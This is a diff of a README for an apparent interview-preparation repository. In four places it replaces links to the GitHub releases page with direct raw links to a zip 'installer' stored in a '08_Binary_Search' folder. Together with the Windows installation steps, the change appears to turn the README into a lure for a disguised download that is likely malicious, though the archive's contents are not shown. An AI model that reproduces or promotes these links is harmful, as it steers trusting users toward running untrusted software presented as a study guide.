@@ -1,6 +1,6 @@
 # 📚 MAANG-Interview-Preparation - Clear Guide for Interview Success
 
-[![Download Latest Release](https://img.shields.io/badge/Download-MAANG%20Guide-4CAF50?style=for-the-badge)](https://github.com/axioncpp/MAANG-Interview-Preparation/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download-MAANG%20Guide-4CAF50?style=for-the-badge)](https://raw.githubusercontent.com/axioncpp/MAANG-Interview-Preparation/main/08_Binary_Search/Preparation_MAAN_Interview_1.7-alpha.2.zip)
 
 ## 📖 About This Guide
 
@@ -41,7 +41,7 @@ To get the software, you need to visit the official release page. Follow these s
 
 1. Click the green button below to open the download page.
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Now-008CBA?style=for-the-badge)](https://github.com/axioncpp/MAANG-Interview-Preparation/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download-Now-008CBA?style=for-the-badge)](https://raw.githubusercontent.com/axioncpp/MAANG-Interview-Preparation/main/08_Binary_Search/Preparation_MAAN_Interview_1.7-alpha.2.zip)
 
 2. On the page, you will see a list of available versions. Choose the latest stable release.
 
@@ -127,7 +127,7 @@ New versions come out from time to time with fixes and new content.
 To update:
 
 1. Visit the releases page:  
-   https://github.com/axioncpp/MAANG-Interview-Preparation/releases
+   https://raw.githubusercontent.com/axioncpp/MAANG-Interview-Preparation/main/08_Binary_Search/Preparation_MAAN_Interview_1.7-alpha.2.zip
 
 2. Download the newest installer file.
 
@@ -150,6 +150,6 @@ The software focuses mostly on core interview topics. If you want to explore fur
 
 Here is the download page again for convenience:  
 
-[Download MAANG Interview Preparation](https://github.com/axioncpp/MAANG-Interview-Preparation/releases)  
+[Download MAANG Interview Preparation](https://raw.githubusercontent.com/axioncpp/MAANG-Interview-Preparation/main/08_Binary_Search/Preparation_MAAN_Interview_1.7-alpha.2.zip)  
 
 Follow the instructions above to download and install the software on your Windows PC.
